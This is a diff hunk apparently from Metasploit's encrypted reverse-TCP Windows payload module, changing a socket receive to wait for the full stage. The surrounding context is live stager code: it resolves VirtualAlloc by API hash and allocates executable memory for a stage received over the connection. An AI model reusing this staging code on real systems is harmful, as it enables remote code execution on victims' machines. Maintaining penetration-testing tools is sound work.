@@ -545,7 +545,7 @@ module Payload::Windows::EncryptedReverseTcp
         FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll', 'VirtualAlloc') -> 0xe553a458
         register char *received = VirtualAlloc(NULL, stage_size + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-        int recv_stg = RecvData(conn_socket, received, stage_size, 0);
+        int recv_stg = RecvData(conn_socket, received, stage_size, MSG_WAITALL);
         if(recv_stg != stage_size)
         {
           ExitProcess(proc_term_status);
